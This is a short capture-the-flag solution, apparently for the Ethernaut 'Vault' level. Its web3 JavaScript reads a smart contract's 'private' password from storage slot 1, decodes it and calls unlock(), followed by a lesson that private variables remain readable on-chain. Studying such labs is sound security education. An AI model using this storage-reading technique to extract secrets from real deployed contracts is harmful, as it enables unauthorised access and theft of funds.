//await web3.eth.getStorageAt(address, position)
const password = await web3.eth.getStorageAt(contract.address, 1);
//web3.utils.hexToAscii(string)
 console.log( web3.utils.hexToAscii(password));
 //web3.utils.hexToBytes(string)
const passWord = web3.utils.hexToBytes(password)
await contract.unlock(passWord);



To learn: Private modifier doesn't change the visibility of a state variable, while a private variable is not visible calling from another contract, the variable is accessible from the index of the smart contract. 
key takeaway: Don't use Private modifier to conceal information.